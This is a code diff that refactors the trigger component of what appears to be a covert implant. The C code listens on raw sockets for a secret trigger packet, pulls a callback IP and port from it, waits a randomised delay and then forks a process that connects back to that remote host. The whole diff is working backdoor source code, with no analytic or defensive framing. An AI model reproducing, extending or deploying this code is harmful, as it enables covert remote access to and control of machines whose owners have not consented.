@@ -33,12 +33,9 @@
 #include <linux/if_ether.h>
 #endif
 
-//******************************************************************
-struct trigger_params
-{
-	int		Delay;
-	payload	Payload;
-};
+#ifdef DEBUG
+#include <arpa/inet.h>
+#endif
 
 //******************************************************************
 //given a range will calculate a psuedo random variance
@@ -111,85 +108,90 @@ void TriggerDelay(int trigger_delay)
 }
 
 //******************************************************************
-#ifdef WIN32
-void start_triggered_connect( void *param )
-#else
 void* start_triggered_connect( void *param )
-#endif
 {
-	struct trigger_params	tParams;
-	struct in_addr			addrin;
-	char					*adrbuf;
-	uint16_t				tb_id;
-	payload					*recvd_payload;
+	TriggerInfo	tParams;
+	struct in_addr	addrin;
+	char		*adrbuf;	// address
+	uint16_t	tb_id;		// port
+//	Payload			*recvd_payload;		// Not used
 
 	// copy the parameters to the local stack and release the memory
 	// now so we don't forget to do it later.
-	memcpy( &tParams, param, sizeof( struct trigger_params ) );
+	memcpy( &tParams, param, sizeof( TriggerInfo ) );
 	if ( param != NULL ) free( param );
 
-	TriggerDelay( tParams.Delay );
+#if DEBUG
+	{
+//		int	i;
+		char	callback_address[INET_ADDRSTRLEN];
+		printf("%s, %4d\n", __FILE__, __LINE__);
+		printf("\t   Trigger Delay: %i\n", tParams.delay);
+		printf("\tCallback Address: %s\n", inet_ntop(AF_INET, (const void*)&(tParams.callback_addr), callback_address, sizeof(callback_address)));
+		printf("\t   Callback Port: %i\n", tParams.callback_port);
+//		printf("\t    Trigger Port: %i\n", tParams.trigger_port);
+//		printf("\t     ID Key Hash: \t");
+		displaySha1Hash("ID Key Hash: ", tParams.idKey_hash);
+//		for (i = 0; i < ID_KEY_HASH_SIZE; i++)
+//			printf("%c", tParams.idKey_hash[i]);
+		printf("\n");
+	}
+#endif
+	TriggerDelay( tParams.delay );
 
 //	dt_exec_payload( &( tParams.Payload ) );
-	recvd_payload = &( tParams.Payload );
+//	recvd_payload = &( tParams.Payload );
 
 	D( printf("%s, %4d: Preparing to exec...\n", __FILE__, __LINE__); )
 
+	// TODO: Fix this for Solaris
+#if 0
 	/* Solaris SPARC has memory alignment issues, so the bytes of interest need, first,
 		to be copied into a variable that is properly aligned */
 	memcpy( &tb_id, &( recvd_payload->package[4] ), sizeof( uint16_t ) );
 	tb_id = htons( tb_id );
 	D( printf("%s, %4d: Received Port: %d\n", __FILE__, __LINE__, tb_id ); )
 
-#if defined WIN32 || defined SOLARIS
+#if defined SOLARIS
 	memcpy( &( addrin.S_un ), &( recvd_payload->package[0] ), sizeof( addrin ) );
 #else
 	memcpy( &( addrin.s_addr ), &( recvd_payload->package[0] ), sizeof( addrin ) );
 #endif
+#endif
 
 	// IPv4 addresses only....
-	adrbuf = inet_ntoa( addrin );
-
-	D( printf("%s, %4d: Received IP: %s\n", __FILE__, __LINE__, adrbuf ); )
-
-	// TODO: it is also possible for connectbackListen() to return an error.
-	// this error should be handled differently than ignoring it.
-	if( SHUTDOWN == TriggerCallbackSession( adrbuf, tb_id) )
 	{
-//#ifdef WIN32
-//		ExitThread(0);
-//#endif
-		exit(0);
+		char	callback_address[INET_ADDRSTRLEN];
+
+		inet_ntop(AF_INET, (const void*)&(tParams.callback_addr), callback_address, sizeof(callback_address));
+
+	//	D( printf("%s, %4d: Received IP: %s\n", __FILE__, __LINE__, adrbuf ); )
+
+		// TODO: it is also possible for connectbackListen() to return an error.
+		// this error should be handled differently than ignoring it.
+		if ( SHUTDOWN == TriggerCallbackSession(callback_address, tParams.callback_port) )
+		{
+			D( printf("%s, %4d\n", __FILE__, __LINE__); )
+			D( return(0); )
+			exit(0);
+		}
 	}
-
 	// since this is a child process, it needs to exit
-#ifdef WIN32
-	ExitThread(0);
-#else
+	D( return(0); )	// Return only for DEBUG, otherwise exit
 	exit( 0 );
-#endif
-
-	// not reached
-	
-// else continue running....
-#ifdef WIN32
-	return;
-#else
-	return (void *)NULL;
-#endif
 }
 
 //******************************************************************
 #if defined LINUX
 int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay ) 
 {
-	int				socket_fd, packet_length;
-	int 	counter = 0;
-	unsigned char	packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this
-	struct sockaddr_ll packet_info;
+	int			socket_fd, packet_length;
+	int 			counter = 0;
+	unsigned char		packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this
+	struct sockaddr_ll	packet_info;
 	size_t 			packet_info_size = sizeof( packet_info);
-	payload 		recvd_payload;
-	struct trigger_params *tParams;
+	Payload 		recvd_payload;
+	TriggerInfo		*tParams;
 
 	D( printf("%s, %4d:\n", __FILE__, __LINE__); )
 	// reap any CHILD processes that die, prevent zombies
@@ -227,23 +229,35 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 			{
 				D( printf( "%s, %4d: Trigger signature found, about to send call back (will wait for trigger_delay)\n", __FILE__, __LINE__); )
 				// this memory is free'd in the thread
-				tParams = calloc( 1, sizeof( struct trigger_params ) );
+				tParams = calloc( 1, sizeof( TriggerInfo ) );
+				if (tParams == NULL) {
+					D (printf( "%s, %4d: Calloc failed.", __FILE__, __LINE__);)
+					return FAILURE;
+				}
 
-				// popluate the structure with the parameters needed inside the thread
-				tParams->Delay = trigger_delay;
-				memcpy( &(tParams->Payload), &recvd_payload, sizeof( payload ) );
+				// Populate the structure with the parameters needed inside the thread.
+				if (payload_to_trigger_info(&recvd_payload, tParams) == FAILURE) {
+					D (printf( "%s, %4d: payload_to_trigger_info failed.\n", __FILE__, __LINE__);)
+					free(tParams);
+					return FAILURE;
+				}
+
+				tParams->delay = trigger_delay;
 
 				update_file((char*)sdfp);
 
-				// create child process... only the parent returns...the child will exit when finished.
-				// note: same function prototype as pthread_create()
-				if ( fork_process( start_triggered_connect, (void *)tParams ) != SUCCESS )
+				// Create child process... only the parent returns...the child will exit when finished.
+				// Note: same function prototype as pthread_create()
+#ifdef DEBUG	// Do not fork in DEBUG
+				start_triggered_connect(tParams);
+#else
+				if ( fork_process( start_triggered_connect, (void *)tParams) != SUCCESS )
 				{
 					D( printf("%s, %4d: ERROR: Failed to create start_triggered_connect thread\n", __FILE__, __LINE__); )
 					if ( tParams != NULL ) free( tParams );
 					return FAILURE;
 				}
-
+#endif
 				// main trigger thread loops to continue listening for additional trigger packets
 			}
 		}
@@ -261,8 +275,8 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 {
 	int				fd, packet_length;
 	unsigned char	packet_buffer[ MAX_PKT ];
-  	payload			recvd_payload;
-	struct trigger_params *tParams;
+  	Payload			recvd_payload;
+	TriggerInfo *tParams;
 	int				counter = 0;
 
 	signal( SIGCHLD, sigchld_reaper );
@@ -307,11 +321,11 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 			{
 				D( printf( " DEBUG: trigger signature found, about to send call back (will wait for trigger_delay)\n" ); )
 				// this memory is free'd in the thread
-				tParams = calloc( 1, sizeof( struct trigger_params ) );
+				tParams = calloc( 1, sizeof( TriggerInfo ) );
 
 				// popluate the structure with the parameters needed inside the thread
 				tParams->Delay = trigger_delay;
-				memcpy( &(tParams->Payload), &recvd_payload, sizeof( payload ) );
+				memcpy( &(tParams->Payload), &recvd_payload, sizeof( Payload ) );
 
 				update_file((char*)sdfp);
 
@@ -344,8 +358,8 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 	char packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this
 	struct sockaddr_in packet_info;
 	int packet_info_size = sizeof( packet_info);
-	payload recvd_payload;
-	struct trigger_params *tParams;
+	Payload recvd_payload;
+	TriggerInfo *tParams;
 
 	socket_fd = dt_get_socket_fd( iface );
 
@@ -397,11 +411,11 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 				expandedfile = NULL;
 
 				// WARNING: this memory is free'd in the thread????? 
-				tParams = calloc( 1, sizeof( struct trigger_params ) );
+				tParams = calloc( 1, sizeof( TriggerInfo ) );
 
 				// popluate the structure with the parameters needed inside the thread
 				tParams->Delay = trigger_delay;
-				memcpy( &(tParams->Payload), &recvd_payload, sizeof( payload ) );
+				memcpy( &(tParams->Payload), &recvd_payload, sizeof( Payload ) );
 
 				make_thread(start_triggered_connect, (void *)tParams);
 
